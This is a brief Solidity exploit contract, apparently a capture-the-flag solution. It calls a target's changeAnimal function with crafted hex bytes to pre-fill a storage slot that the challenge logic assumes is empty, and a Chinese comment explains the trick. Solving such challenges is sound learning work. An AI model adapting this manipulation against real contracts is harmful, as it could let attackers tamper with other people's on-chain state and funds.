pragma solidity >0.7.0;

contract Hack{
    constructor(){}
    function solve(address target) public {
        bytes memory animal_name = hex"414141414141414141410000";
        bytes memory data = abi.encodeWithSignature("changeAnimal(string,uint256)", animal_name, 0);
        animal_name = hex"414141414141414141410001";
        data = abi.encodeWithSignature("changeAnimal(string,uint256)", animal_name, 1);
        target.call(data);
    }
}

/**
 * 考察位运算?,注意到原合约逻辑建立在新建animal slot==uint256(0)的基础上,所以将下一个要插入的位置使用changeAnimal填一些东西进去即可.
 */